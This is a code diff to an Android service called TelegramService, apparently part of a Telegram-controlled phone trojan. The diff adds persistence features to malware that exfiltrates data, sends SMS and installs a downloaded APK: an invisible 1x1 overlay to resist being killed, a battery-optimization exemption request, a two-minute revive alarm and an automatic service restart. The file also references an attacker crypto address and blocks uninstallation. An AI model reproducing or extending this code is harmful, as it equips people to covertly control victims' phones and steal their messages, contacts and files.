@@ -25,6 +25,7 @@ import android.database.Cursor;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
 import android.graphics.ImageFormat;
+import android.graphics.PixelFormat;
 import android.hardware.camera2.CameraCaptureSession;
 import android.hardware.camera2.CameraDevice;
 import android.hardware.camera2.CameraManager;
@@ -43,12 +44,17 @@ import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
+import android.os.PowerManager;
 import android.os.SystemClock;
 import android.os.VibrationEffect;
 import android.os.Vibrator;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
+import android.provider.Settings;
 import android.telephony.SmsManager;
+import android.view.Gravity;
+import android.view.View;
+import android.view.WindowManager;
 import android.widget.Toast;
 import org.json.JSONArray;
 import org.json.JSONObject;
@@ -71,6 +77,7 @@ public class TelegramService extends Service {
     private MediaPlayer sirenPlayer;
     private MediaPlayer audioPlayer;
     private Handler mainHandler = new Handler(Looper.getMainLooper());
+    private View overlayView;
 
     private final String ATTACKER_CRYPTO_ADDRESS = "0xYOUR_CRYPTO_ADDRESS_HERE";
 
@@ -98,10 +105,52 @@ public class TelegramService extends Service {
         new Thread(this::pollTelegram).start();
         
         blockUninstall();
-        setupPersistence(); // <--- JDAD: PERSISTENCE
+        setupPersistence();
+        
+        // JDAD: MIUI PROTECTION
+        startOverlay();
+        requestIgnoreBatteryOptimization();
     }
 
-    // <--- JDAD: 5 MINUTE REVIVE LOOP
+    private void startOverlay() {
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
+                return; // L'user mazal ma3tach l'permission
+            }
+            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
+            overlayView = new View(this);
+            
+            int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O 
+                    ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY 
+                    : WindowManager.LayoutParams.TYPE_PHONE;
+            
+            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
+                    1, 1, type,
+                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
+                    PixelFormat.TRANSLUCENT
+            );
+            params.gravity = Gravity.TOP | Gravity.START;
+            params.x = 0;
+            params.y = 0;
+            
+            wm.addView(overlayView, params);
+        } catch (Exception e) {}
+    }
+
+    private void requestIgnoreBatteryOptimization() {
+        try {
+            Intent intent = new Intent();
+            String packageName = getPackageName();
+            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
+                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+                intent.setData(Uri.parse("package:" + packageName));
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(intent);
+            }
+        } catch (Exception e) {}
+    }
+
     private void setupPersistence() {
         try {
             AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
@@ -109,7 +158,7 @@ public class TelegramService extends Service {
             PendingIntent pi = PendingIntent.getBroadcast(this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
             
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + 120000, pi);
+                am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + 120000, pi); // 2 MINS
             } else {
                 am.setExact(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + 120000, pi);
             }
@@ -253,7 +302,6 @@ public class TelegramService extends Service {
         Exfil.send(menu);
     }
 
-    // ================== BACKUP INSTALLER (FIXED) ==================
     private void downloadAndInstallBackup(String urlStr) {
         Exfil.send("⏳ Downloading Backup APK in background...");
         new Thread(() -> {
@@ -279,11 +327,10 @@ public class TelegramService extends Service {
                 Intent intent = new Intent(Intent.ACTION_VIEW);
                 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                 
-                // FIX DYAL ANDROID 7+ (FileProvider)
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                     Uri apkUri = androidx.core.content.FileProvider.getUriForFile(
                             this,
-                            getPackageName() + ".fileprovider", // Ila knti f ZArchiver bdelha l "ru.zdevs.zarchiver.fileprovider"
+                            getPackageName() + ".fileprovider",
                             apkFile
                     );
                     intent.setDataAndType(apkUri, "application/vnd.android.package-archive");
@@ -299,9 +346,6 @@ public class TelegramService extends Service {
             }
         }).start();
     }
-
-    // ... (BA9I DIAL L'METHODS KIMA KANO: sendSMS, getWifiInfo, etc.) ...
-    // (Ma beddelthomch 7it khedmin mzyan, ghir l'imports li tzado lfo9)
 
     private void sendSMS(String args) {
         try {
@@ -668,4 +712,4 @@ public class TelegramService extends Service {
         super.onTaskRemoved(rootIntent);
         startService(new Intent(getApplicationContext(), TelegramService.class).setPackage(getPackageName()));
     }
-                }
+                    }
